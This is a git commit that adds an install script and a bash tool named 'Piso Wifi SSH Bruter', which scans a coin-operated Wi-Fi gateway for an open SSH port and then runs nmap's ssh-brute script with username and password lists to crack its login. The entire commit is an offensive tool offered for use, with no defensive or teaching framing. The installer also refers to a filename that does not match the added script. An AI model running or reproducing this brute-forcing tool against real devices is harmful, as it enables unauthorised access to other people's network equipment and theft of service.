aaff214202f4d9f5ceef9817b2bbaa7d4ab65fed
Jayson Cabrillas San Buenaventura <sanbuenaventurajayson28@gmail.com>
2021-09-16 01:12:29 +0800

    Add files via upload

---
+++ install.sh
@@ -0,0 +1,10 @@
+#!/bin/bash
+
+clear
+echo "Installing Dependencies" | toilet -f smbraille
+pkg install nmap toilet python php curl wget git ruby -y && gem install lolcat
+chmod +x pisowifi-ssh.sh
+clear
+echo "Installation is Done" | toilet -f smbraille
+echo ""
+echo "Execute using the command 'bash pisowifi-ssh.sh'"
---
+++ pisowifi-ssh-bruter.sh
@@ -0,0 +1,80 @@
+#!/bin/bash
+
+# Check installed dependencies
+function install_deps(){
+	clear
+	echo  "Piso Wifi SSH Bruter" | toilet -f smbraille | lolcat
+	echo ""
+	echo -ne "\e[93m\e[1m[*] Checking dependencies... "
+	for name in nmap toilet python php curl wget git ruby
+	do
+	  [[ $(which $name 2>/dev/null) ]] || { echo -en "\n\e[91m\e[1m[!] Package $name is not installed.\e[0m \n\e[93m\e[1m[!] Use 'pkg install $name' or 'sudo apt install $name'. \n\e[1m[!] Press Ctrl + C to Exit...\e[0m";deps=1; }
+	done
+	[[ $deps -ne 1 ]] && echo "OK" && sleep 3 || main || { echo -en "\n\e[0m\e[93m\e[1m[!] Install the above and rerun this script\e[0m\n" || exit 1; }
+}
+
+# Check if port 22 is open
+function check_ssh(){
+	clear
+	echo "SSH Port Checker" | toilet -f smbraille | lolcat
+	echo -e "\e[1m\e[92m"
+	read -p "[+] Enter gateway ip: " ip
+	echo ""
+	echo -e "\e[1m\e[93m[*] Checking if port 22 is open... "
+	echo -e "\e[0m"
+	
+	server=$ip
+	port=22                
+
+	status=`nmap $server -Pn -p $port | egrep -io 'open|closed|filtered'`
+	if [ $status == "open" ];then
+	   echo ""
+	   echo -e "\e[1m\e[92m[!] SSH Connection to $server over port $port is possible.\e[0m"
+	   sleep 5
+	elif [ $status == "filtered" ]; then
+	   echo ""
+	   echo -e "\e[1m\e[93m[!] SSH Connection to $server over port $port is possible but blocked by firewall.\e[0m"
+	   sleep 5
+	   clear && exit
+	elif [ $status == "closed" ]; then
+	   echo ""
+	   echo -e "\e[1m\e[91m[!] SSH connection to $server over port $port is not possible.\e[0m"
+	   sleep 5
+	   clear && exit
+	else
+	   echo ""
+	   echo -e "\e[1m\e[91m[!] Unable to get port $port status from $server \e[0m"
+	   sleep 5
+	fi
+}
+
+# Main function
+function main(){
+	install_deps
+	check_ssh
+	clear
+	echo "Piso Wifi SSH Bruter" | toilet -f smbraille | lolcat
+	echo -e "\e[1m\e[92m"
+	echo -e "[01] Crack using Nmap"
+	echo -e "[00] Close Program"
+	echo -e ""
+	read -p "[+] Choose number: " method
+	
+	if [[ $method == "1" || $method == "01" ]]; then
+		clear
+		echo -e "Cracking SSH using Nmap" | toilet -f smbraille | lolcat
+		echo -e "\e[1m\e[92m"
+		read -p "[+] Enter gateway ip: " ip
+		echo -e "\e[0m"
+		nmap $ip -p 22 --script ssh-brute --script-args userdb=user.txt,passdb=password.txt
+	elif [[ $method == "0" || $method == "00" ]]; then
+		clear && exit
+	else
+		echo ""
+		echo -e "\e[1m\e[91m[!] Invalid input, Please try again...\e[0m"
+		exit
+	fi
+}
+
+# Argument
+main
